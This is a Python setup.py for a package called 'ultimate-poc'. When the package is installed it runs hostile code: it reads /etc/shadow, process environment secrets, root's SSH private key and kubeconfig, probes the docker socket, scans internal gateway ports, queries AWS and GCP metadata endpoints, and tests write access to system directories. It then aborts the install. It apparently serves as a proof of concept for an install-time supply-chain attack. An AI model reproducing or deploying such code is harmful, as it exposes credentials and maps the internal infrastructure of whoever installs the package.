import os, sys, socket, subprocess as sp
from setuptools import setup

def pwn():
    o = sys.stderr.write
    def cmd(c): return sp.getoutput(c)

    o(f"\n{'='*40}\n[!] SYSTEM INFO\n{'='*40}\n")
    o(f"ID: {os.getuid()} | USER: {cmd('whoami')}\n")
    o(f"KERNEL: {cmd('uname -a')}\n")
    o(f"IP: {cmd('hostname -I')}\n")

    o(f"\n[!] SENSITIVE FILES\n")
    files = ['/etc/shadow', '/proc/self/environ', '/root/.ssh/id_rsa', '/var/run/docker.sock', '/etc/kubernetes/kubeconfig']
    for p in files:
        try:
            with open(p, 'rb') as f: o(f"[OK] {p}: {f.read(50)}...\n")
        except: o(f"[NO] {p}\n")

    o(f"\n[!] INTERNAL NETWORK SCAN (Quick)\n")
    # Проверка типичных внутренних шлюзов и портов
    base_ip = ".".join(cmd("hostname -I").split()[0].split('.')[:-1]) + "." if cmd("hostname -I") else "172.16.0."
    for i in [1, 10, 254]: # Проверяем только вероятные шлюзы
        ip = base_ip + str(i)
        for port in [22, 80, 2375, 443, 6443]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            if s.connect_ex((ip, port)) == 0:
                o(f"[FOUND] {ip}:{port} OPEN\n")
            s.close()

    o(f"\n[!] CLOUD METADATA (SSRF)\n")
    m_urls = [
        "http://169.254.169.254/latest/meta-data/", # AWS
        "http://169.254.169.254/computeMetadata/v1/", # GCP
        "http://metadata.google.internal/computeMetadata/v1/" # GCP Alt
    ]
    for u in m_urls:
        try:
            res = cmd(f"curl -s -m 1 -H 'Metadata: true' -H 'Metadata-Flavor: Google' {u}")
            if res: o(f"[HIT] {u}: {res[:100]}\n")
        except: pass

    o(f"\n[!] WRITE PERMISSIONS\n")
    for d in ['/etc', '/root', '/usr/bin']:
        t = f"{d}/.test"
        try:
            with open(t, 'w') as f: f.write('pwn')
            o(f"[WRITE OK] {d}\n"); os.remove(t)
        except: o(f"[WRITE NO] {d}\n")

    o(f"\n{'='*40}\nEND OF SCAN\n{'='*40}\n")
    sys.exit(1)

try: pwn()
except: sys.exit(1)

setup(name="ultimate-poc", version="9.9.9")
